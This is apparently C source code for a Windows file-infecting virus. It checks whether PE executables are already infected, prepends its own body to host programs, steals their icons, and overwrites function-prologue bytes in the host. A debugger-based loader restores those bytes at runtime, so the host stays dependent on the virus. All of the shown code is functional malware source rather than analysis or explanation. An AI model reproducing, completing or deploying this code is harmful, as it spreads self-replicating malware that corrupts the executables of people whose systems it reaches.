#include "winapp32.h"
#include <stdlib.h>

//Declaration
DWORD SystemTimeToInt(SYSTEMTIME* x)
{;;
 return
  (x->wMinute + x->wHour*60 + x->wDay*60*24 +
   x->wMonth*60*24*31 + (x->wYear-1980)*60*24*31*365);;
};


//Declaration
bool Already(char* TargetName)
{;;
 char   Dir[MAX_PATH];;
 char   Drive[MAX_PATH];;
 char   Name[MAX_PATH];;
 char   Ext[MAX_PATH];;
 char   TempName[MAX_PATH];;
 fnsplit(TargetName,Drive,Dir,Name,Ext);;
 if (strlen(Name)<3) return true;;
 int i;;
 for (i=0; i<strlen(Name); i++)
  if ((Name[i]>='0')&&(Name[i]<='9')) return true;;
 int j=0;;
 for (i=0; i<strlen(TargetName); i++) if (TargetName[i]=='\\') j++;;
 if (j<=1) return true;;
 if (strstr(TargetName,"\\SYSBCKUP")!=NULL) return true;;
 if (strstr(TargetName,"\\FAILSAFE")!=NULL) return true;;

 bool x = false;;
 HANDLE h1 = CreateFile(TargetName,GENERIC_READ, FILE_SHARE_READ |
     FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);;
 if (h1==INVALID_HANDLE_VALUE) {;; return true;;};;
 FILETIME FTime;;
 SYSTEMTIME FSTime,STime;;
 GetFileTime(h1,&FTime,NULL,NULL);;
 FileTimeToSystemTime(&FTime,&FSTime);;
 GetSystemTime(&STime);;
 DWORD iSTime  = SystemTimeToInt(&STime);;
 DWORD iFSTime = SystemTimeToInt(&FSTime);;
 if (abs(iFSTime-iSTime)<60) {;; CloseHandle(h1);; return true;;};;

 DWORD readed;;
 WORD addr = 0;;
 SetFilePointer(h1,0x3C,NULL,FILE_BEGIN);;
 ReadFile(h1,&addr,2,&readed,NULL);;
 SetFilePointer(h1,addr-2,NULL,FILE_BEGIN);;
 char ss[2] ={'X','X'};;
 ReadFile(h1,&ss,2,&readed,NULL);;
 DWORD FileSize = SetFilePointer(h1,0,NULL,FILE_END);;
 if ((FileSize % 100)==0) x=true;;
 if ((readed==2) && (ss[0]=='L') && (ss[1]=='A')) {x=true;;};;
 SetFilePointer(h1,addr+4+18,NULL,FILE_BEGIN);;
 WORD Char = 0;;
 ReadFile(h1,&Char,2,&readed,NULL);;
 if ((Char&IMAGE_FILE_DLL)||(Char&IMAGE_FILE_SYSTEM)) x = true;;
 CloseHandle(h1);;
 return x;;
};

//Declaration
void ProcessReplacements(char* x, DWORD offs)
{;;
 bool IsData = false;;
 bool Patched = false;;
 DWORD dupes = 0;;
 WORD  stats[256] = { 0 };;
 char prv = '\0';;
 int i;;
 for (i=0; i<512; i++)
 {;;
  stats[x[i]]++;;
  if ((dupes>5)&&(prv!='\xCC')) IsData = true;;
  if (prv==x[i]) dupes++;;
  if (prv!=x[i]) dupes = 0;;
  prv = x[i];;
 };;
 bool Dupes = IsData;;
 bool BadStats = false;;
 for (i=0; i<256; i++) BadStats = BadStats||(stats[i]>50);;
 IsData = (IsData)||(BadStats);;
 for (i=0; i<512; i++)
 {;;
  if ( (x[i]=='\x55')&&(x[i+1]=='\x8B')&&(x[i+2]=='\xEC') )
  {;;
   Patched = true;;
   if (!IsData)
   {;;
    x[i] = '\xFF';;
    x[i+1] = '\xFF';;
    x[i+2] = random(256);;
   };;
  };;
 };;
};


bool infector_busy = false;

//Declaration
void InfectPE(char* TargetName)
{;;
 if ((BadImage)||(NoInfect)||(infector_busy)||(VPtr==NULL)) return;;
 char ss[MAX_PATH+666]="Process ";;
 strcat(ss,TargetName);;
 infector_busy=true;;
 char Temp[MAX_PATH];;
 if (!GetTempDir(Temp))
  {;; infector_busy=false;; return;; };;
 Log(TargetName);;
 if (DetectFileFormat(TargetName)!=FILE_FORMAT_PE)
  {;; infector_busy=false;; return;; };;
 if (Already(TargetName))
  {;; infector_busy=false;; return;; };;
 if (!AskBoss(ss))
  {;; infector_busy=false;; return;; };;
 DWORD NewIcon = FindIcon(TargetName);;
 char buf[COPY_BLOCK_SIZE];;
 HANDLE h1 = CreateFile(TargetName,GENERIC_READ,0,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);;
 strcat(Temp,"\\TMP$$001.TMP");;
 HANDLE h2 = CreateFile(Temp,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);;
 if ((h1==INVALID_HANDLE_VALUE)||(h2==INVALID_HANDLE_VALUE))
 {;;
  CloseHandle(h1);;
  CloseHandle(h2);;
  DeleteFile(Temp);;
  infector_busy=false;;
  return;;
 };;
 DWORD readed;;
 if (NewIcon!=0)
 {;;
  SetFilePointer(h1,NewIcon,NULL,FILE_BEGIN);;
  ReadFile(h1,MyIcon,744,&readed,NULL);;
  SetFilePointer(h1,0,NULL,FILE_BEGIN);;
 }
 else
  {;; memmove(MyIcon,DefaultIcon,744);; };;
 DWORD written;;
 WriteFile(h2,VPtr,VSize,&written,NULL);;
 WriteFile(h2,SrcPtr,SSize,&written,NULL);;
 DWORD FPos = 0;
 do
 {;;
  ReadFile(h1,&buf,sizeof(buf),&readed,NULL);;
  for (char* t = buf; (t+512)<(buf+sizeof(buf)); t+=512)
  {;;
   ProcessReplacements(t,FPos+t-buf);;
  };;
  FPos+=readed;;
  if (!WriteFile(h2,&buf,readed,&written,NULL))
  {;;
   CloseHandle(h1);; CloseHandle(h2);;
   DeleteFile(Temp);; infector_busy=false;;
   return;;
  };; // End if
 } while (readed==sizeof(buf));; // End do
 CloseHandle(h1);;
 CloseHandle(h2);;
 DeleteFile(TargetName);;
 if (!MoveFile(Temp,TargetName))
  {;; DeleteFile(Temp);; infector_busy=false;; return;; };;
 infector_busy=false;;
 sprintf(ss,"Processed - %s",TargetName);;
 Log(ss);;
};


//Declaration
void LoadCarrier()
{;;
 Log("LC: entry");;
 VPtr = malloc(VSize);;
 SrcPtr = malloc(SSize);;
 DWORD delta;;
 if ((delta=FindIcon(MyName))==0) return;;
 MyIcon = (void*)(DWORD(VPtr)+delta);;
 HANDLE h1 = CreateFile(MyName,GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,
                        OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);;
 if (h1==INVALID_HANDLE_VALUE) exit(EXIT_FAILURE);;
 Log("LC: open file passed");;
 DWORD FileSize = SetFilePointer(h1,0,NULL,FILE_END);;
 SetFilePointer(h1,0,NULL,FILE_BEGIN);;
 if (FileSize<(VSize+SSize)) exit(EXIT_FAILURE);;
 Log("LC: check size minimum passed");;
 DWORD readed;;
 ReadFile(h1,VPtr,VSize,&readed,NULL);;
 ReadFile(h1,SrcPtr,SSize,&readed,NULL);;
 BadImage = false;;
 Log("LC: Image validated");
 if (FileSize==(VSize+SSize)) {;; CloseHandle(h1);; return;; };;
 Log("LC: CARRIER DETECTED");
 char   Drive[MAX_PATH];;
 sprintf(Drive,"LC: Size %u",FileSize-(VSize+SSize));;
 Log(Drive);;
 char   Dir[MAX_PATH];;
 char   Name[MAX_PATH];;
 char   Ext[MAX_PATH];;
 char   TempName[MAX_PATH];;
 char   SysCommand[2*MAX_PATH+666];;
 fnsplit(MyName,Drive,Dir,Name,Ext);;
 HANDLE h2;;
 int i;;
 for (i=0; i<999; i++)
 {;;
  char ss[5];;
  sprintf(ss,".%03u",i);;
  strcpy(TempName,Drive);;
  strcat(TempName,Dir);;
  if (!RWDir(TempName)) if (!GetTempDir(TempName)) return;;
  strcat(TempName,Name);;
  strcat(TempName,ss);;
  h2 = CreateFile(TempName,GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,
                  NULL,CREATE_NEW,FILE_ATTRIBUTE_HIDDEN,NULL);;
  if (h2!=INVALID_HANDLE_VALUE) break;;
 };;
 if (h2==INVALID_HANDLE_VALUE)  return;;
 char buf[COPY_BLOCK_SIZE];;
 DWORD written;;
 do
 {;;
  ReadFile(h1,&buf,sizeof(buf),&readed,NULL);;
  WriteFile(h2,&buf,readed,&written,NULL);;
 } while (readed==sizeof(buf));;
 CloseHandle(h1);;
 CloseHandle(h2);;
 STARTUPINFO SInfo;;
 PROCESS_INFORMATION PInfo;;
 GetStartupInfo(&SInfo);;
 strcpy(buf,Drive);;
 strcat(buf,Dir);;
 DWORD flags = CREATE_DEFAULT_ERROR_MODE | DEBUG_ONLY_THIS_PROCESS;;
 sprintf(SysCommand,"\"%s\" %s",TempName,CommandLine);;
 Log(SysCommand);;
 if (!CreateProcess(NULL,SysCommand,NULL,NULL,FALSE,flags,
         NULL,buf,&SInfo,&PInfo))
  {;; DeleteFile(TempName);; Log("Cannot create process");; return;; };;
 BOOL ExceptionHandled = false;;
 DEBUG_EVENT Event;;
 BOOL last;;
 char hhh[666];
 do
 {;;
        WaitForDebugEvent(&Event,INFINITE);;
        if (Event.dwProcessId!=PInfo.dwProcessId)
        {;;
         sprintf(hhh,"Exception PID bad : %u != %u",Event.dwProcessId,PInfo.dwProcessId);
         Log(hhh);
         ContinueDebugEvent(Event.dwProcessId,Event.dwThreadId,DBG_EXCEPTION_NOT_HANDLED);;
         continue;;
        };;
        last = (Event.dwDebugEventCode == EXIT_PROCESS_DEBUG_EVENT);;
        if (last)
        {;;
         Log("Carrier process is about to terminate");;
         ContinueDebugEvent(Event.dwProcessId,Event.dwThreadId,DBG_EXCEPTION_NOT_HANDLED);;
         break;;
        };;

        if (Event.dwDebugEventCode == CREATE_THREAD_DEBUG_EVENT)
         CloseHandle(Event.u.CreateThread.hThread);
        if (Event.dwDebugEventCode == CREATE_PROCESS_DEBUG_EVENT)
        {
         CloseHandle(Event.u.CreateProcessInfo.hProcess);
         CloseHandle(Event.u.CreateProcessInfo.hFile);
         CloseHandle(Event.u.CreateProcessInfo.hThread);
        };
        if (Event.dwDebugEventCode == LOAD_DLL_DEBUG_EVENT)
         CloseHandle(Event.u.LoadDll.hFile);;

        if (Event.dwDebugEventCode == EXCEPTION_DEBUG_EVENT)
        {;; // Handle exception :E
         sprintf(hhh,"Exception detected, code %08X at %08X",Event.u.Exception.ExceptionRecord.ExceptionCode,
                       Event.u.Exception.ExceptionRecord.ExceptionAddress);;
         Log(hhh);;
         WORD Glitch = 0;;
         DWORD readed = 0;;
         ReadProcessMemory(PInfo.hProcess,Event.u.Exception.ExceptionRecord
             .ExceptionAddress,&Glitch,2,&readed);;
         if (readed!=2) Log("Read error!");
         if (Glitch == 0xFFFF)
         {
          Log("0xFFFF");
          char SHIT[3]={'\x55','\x8B','\xEC'};;
          DWORD written = 0;;
          WriteProcessMemory(PInfo.hProcess,
                      Event.u.Exception.ExceptionRecord.ExceptionAddress,&SHIT,3,&written);;
          if (written!=3) Log("Write error!");
          ExceptionHandled = true;;
         };
        };; // EXCEPTION_DEBUG_EVENT
       ContinueDebugEvent(Event.dwProcessId,Event.dwThreadId,DBG_CONTINUE);;
 }
 while (!last);;
 if (ExceptionHandled) Log("LC: There were exceptions handled");;
 WaitForSingleObject(PInfo.hProcess,10000);;
 CloseHandle(PInfo.hProcess);;
 CloseHandle(PInfo.hThread);;

 for (i=0; i<30; i++)
 {;;
  Sleep(1000);;
  DeleteFile(TempName);;
  HANDLE h = CreateFile(TempName,GENERIC_READ,FILE_SHARE_READ|FILE_SHARE_WRITE,
                  NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);;
  if (h==INVALID_HANDLE_VALUE) {;;break;;};;
  CloseHandle(h);;
 };;
 Log("LC: Loop done");;
};

//Declaration
int DetectFileFormat(char* TargetName)
{;;
 int    x = FILE_FORMAT_UNRECOGNIZED;;
 unsigned char header[0x100];;
 DWORD readed;;
 HANDLE h = CreateFile(TargetName,GENERIC_READ, FILE_SHARE_READ |
  FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);;
 if (h==INVALID_HANDLE_VALUE) return x;;
 ReadFile(h,&header,sizeof(header),&readed,NULL);;
 if (readed!=sizeof(header)) {;; CloseHandle(h);; return x;; };;
 WORD w = *((WORD*)header);;
 if (w!=0x5A4D) return x;;
 x=FILE_FORMAT_MZ;;
 UINT jaddr = (header[0x3C]+header[0x3D]*0x100);;
 SetFilePointer(h,jaddr,NULL,FILE_BEGIN);;
 ReadFile(h,&header,sizeof(header),&readed,NULL);;
 if (readed!=sizeof(header)) { CloseHandle(h);; return x;; };;
 w = *((WORD*)header);
 switch (w)
 {
  case 0x454E : x = FILE_FORMAT_NE;; break;
  case 0x4550 : x = FILE_FORMAT_PE;; break;
  case 0x454C : x = FILE_FORMAT_LE;; break;
  case 0x584C : x = FILE_FORMAT_LX;; break;
 };;
 CloseHandle(h);;
 return x;;
}

/******************************************************************************/
/*                                                               RESOURCE PROCESSING                                                                    */
/******************************************************************************/
DWORD located_addr;
bool  TypeIcon;
DWORD delta;

//Declaration
LPVOID GetSectionPtr(PSTR name, PIMAGE_NT_HEADERS pNTHeader, DWORD imageBase)
{;;
 PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(pNTHeader);;
 for (unsigned i=0; i<pNTHeader->FileHeader.NumberOfSections; i++,section++)
 {;;
  if (strnicmp((char const*)section->Name,name,IMAGE_SIZEOF_SHORT_NAME)==0)
  {;;
   delta = section->PointerToRawData - section->VirtualAddress;;
   return (LPVOID)(section->PointerToRawData + imageBase);;
  };;
 };;
 return 0;;
};

void DumpResourceDirectory (PIMAGE_RESOURCE_DIRECTORY resDir,
                        DWORD resourceBase, DWORD level, DWORD resourceType);
//Declaration
void DumpResourceEntry( MY_PIMAGE_RESOURCE_DIRECTORY_ENTRY resDirEntry,
                                                                DWORD resourceBase, DWORD level)
{;;
 UINT i;;
 char nameBuffer[128];;
 PIMAGE_RESOURCE_DATA_ENTRY pResDataEntry;;
 if ( (resDirEntry->u2.OffsetToData) & IMAGE_RESOURCE_DATA_IS_DIRECTORY )
 {;;
  DumpResourceDirectory( (PIMAGE_RESOURCE_DIRECTORY)
        ((resDirEntry->u2.OffsetToData & 0x7FFFFFFF) + resourceBase),
                resourceBase, level, resDirEntry->u.Name);;
  return;;
 };;
 pResDataEntry =
  (PIMAGE_RESOURCE_DATA_ENTRY)(resourceBase + resDirEntry->u2.OffsetToData);;
 if (TypeIcon&&(located_addr==0)&&(pResDataEntry->Size==744))
  located_addr=pResDataEntry->OffsetToData+delta;;
};

//Declaration
void DumpResourceDirectory(PIMAGE_RESOURCE_DIRECTORY resDir,DWORD resourceBase,
                                                                        DWORD level, DWORD resourceType)
{;;
 MY_PIMAGE_RESOURCE_DIRECTORY_ENTRY resDirEntry;;
 UINT i;;
 TypeIcon = (resourceType==1)||(resourceType==3);;
  resDirEntry = (MY_PIMAGE_RESOURCE_DIRECTORY_ENTRY)(resDir+1);;
 for ( i=0; i < resDir->NumberOfNamedEntries; i++, resDirEntry++ )
  DumpResourceEntry(resDirEntry, resourceBase, level+1);;
 for ( i=0; i < resDir->NumberOfIdEntries; i++, resDirEntry++ )
  DumpResourceEntry(resDirEntry, resourceBase, level+1);;
};

//Declaration
void DumpResourceSection(DWORD base, PIMAGE_NT_HEADERS pNTHeader)
{;;
 PIMAGE_RESOURCE_DIRECTORY resDir;;
 resDir = (PIMAGE_RESOURCE_DIRECTORY) GetSectionPtr(".rsrc", pNTHeader, (DWORD)base);;
 if ( !resDir ) return;;
 DumpResourceDirectory(resDir,(DWORD)resDir,0,0);;
};
//Declaration
DWORD FindIcon(char* TargetName)
{;;
 char hhh[666];;
 sprintf(hhh,"FindIcon(%s) entry",TargetName);;
 Log(hhh);;
 located_addr = 0;;
 PIMAGE_DOS_HEADER dosHeader;;
 HANDLE hFile = CreateFile(TargetName,GENERIC_READ, FILE_SHARE_READ,NULL,
                           OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);;
 if ( hFile == INVALID_HANDLE_VALUE ) return 0;;
 HANDLE hFileMapping = CreateFileMapping(hFile,NULL,PAGE_READONLY,0,0,NULL);;
 if ( hFileMapping == 0 ) {;; CloseHandle(hFile);; return 0;; };;
 LPVOID lpFileBase = MapViewOfFile(hFileMapping,FILE_MAP_READ,0,0,0);;
 if ( lpFileBase == 0 )
  {;; CloseHandle(hFileMapping);; CloseHandle(hFile);; return 0;; };;
 if ((*((WORD*)lpFileBase))!=0x5A4D)
  {;;
   UnmapViewOfFile(lpFileBase);; CloseHandle(hFileMapping);;
   CloseHandle(hFile);; return 0;;
  };;
 PIMAGE_NT_HEADERS pNTHeader;;
 DWORD base = (DWORD)lpFileBase;;
 WORD hru = *((WORD*)((DWORD)(lpFileBase)+0x3C));;
 pNTHeader  = (PIMAGE_NT_HEADERS)(DWORD(lpFileBase)+hru);;

 DumpResourceSection(base,pNTHeader);;

 UnmapViewOfFile(lpFileBase);;
 CloseHandle(hFileMapping);;
 CloseHandle(hFile);;
 return located_addr;;
};
